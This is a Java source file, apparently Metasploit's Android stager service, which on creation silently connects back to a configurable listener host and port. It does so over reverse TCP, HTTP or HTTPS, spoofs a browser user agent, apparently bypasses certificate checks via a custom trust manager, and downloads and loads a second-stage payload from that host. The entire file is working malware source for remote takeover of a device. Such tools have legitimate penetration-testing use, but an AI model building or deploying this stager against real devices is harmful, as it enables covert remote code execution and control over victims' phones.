package com.metasploit.android.stage;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;

import javax.net.ssl.HttpsURLConnection;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.widget.Toast;

public class StageService extends Service {

	 // avoid re-ordering the strings in classes.dex - append XXXX
    public static final String LHOST = 		"XXXX127.0.0.1:M                     ";
    public static final String LPORT = 		"YYYY4444                            "; 
	
	int mStartMode;
	private boolean isRunning = true;
	private Socket msgsock;
	private HttpURLConnection urlConn;
	
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}
	
	@Override
	public void onCreate () {
		//Toast.makeText(this, "Service Started", Toast.LENGTH_SHORT).show();
		startAsync(); 
	}

    private void startAsync() {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
            	String lprotocol = LHOST.substring(4).trim().split(":")[1];
            	
            	if (lprotocol.equals("T")) {
            		reverseTCP();
            	}
            	else if (lprotocol.equals("H")) {
            		reverseHTTP(false);
            	}
            	else if (lprotocol.equals("HS")) {
            		reverseHTTP(true);
            	}
            	
            	return null;
            }
        }.execute();
    }

    static final String AB = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    static Random rnd = new Random();
    String randomString( int len ) 
    {
       StringBuilder sb = new StringBuilder( len );
       for( int i = 0; i < len; i++ ) 
          sb.append( AB.charAt( rnd.nextInt(AB.length()) ) );
       return sb.toString();
    }

    int checksumText(String s) {
    	int tmp = 0;
    	for(int i = 0; i < s.length(); i++)
    		tmp += (int)s.charAt(i);
    	return tmp % 0x100;
    }
    
    static int URI_CHECKSUM_INITJ = 88;
    
    private void reverseHTTP(boolean ssl) {
    	int checksum = 0;
    	String URI;
    	
    	try { 	
            String lhost = LHOST.substring(4).trim().split(":")[0];
            String lport = LPORT.substring(4).trim();
            
            while(true) {
            	URI = randomString(4);		
            	checksum = checksumText(URI);	
            	if(checksum == URI_CHECKSUM_INITJ) break;
        	}
          
            String FullURI = "/" + URI.toString();
            
            String urlStart = ssl ? "https://" : "http://";
            
    		URL url = new URL(urlStart + lhost + ":" + lport + FullURI + "_" + randomString(16));	 
	    	
	    	if (ssl) { 
	    		urlConn = (HttpsURLConnection) url.openConnection();
	    		Class.forName("com.metasploit.android.stage.PayloadTrustManager")
	    		.getMethod("useFor", new Class[] {URLConnection.class}).invoke(null, new Object[] {urlConn});
	    	}
	    	else urlConn = (HttpURLConnection) url.openConnection();
	    	
	        urlConn.setDoInput (true);
	        urlConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0");
	        urlConn.setRequestMethod("GET");
	        urlConn.connect();
	        DataInputStream in = new DataInputStream(urlConn.getInputStream());
	        new LoadStage().start(in, null, getApplicationContext(), new String[] {});	        
	        urlConn.disconnect();    	
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void reverseTCP() {
        try {
            String lhost = LHOST.substring(4).trim().split(":")[0];
            String lport = LPORT.substring(4).trim();
            msgsock = new Socket(lhost, Integer.parseInt(lport));
            DataInputStream in = new DataInputStream(msgsock.getInputStream());
            OutputStream out = new DataOutputStream(msgsock.getOutputStream());
            new LoadStage().start(in, out, getApplicationContext(), new String[] {});
            msgsock.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public void onDestroy() {
    	isRunning = false;
    	try {
			msgsock.close();
            urlConn.disconnect();
		} catch (IOException e) {

			e.printStackTrace();
		}
    	//Toast.makeText(this, "Service Stopped", Toast.LENGTH_SHORT).show();
    	super.onDestroy();
    }

}
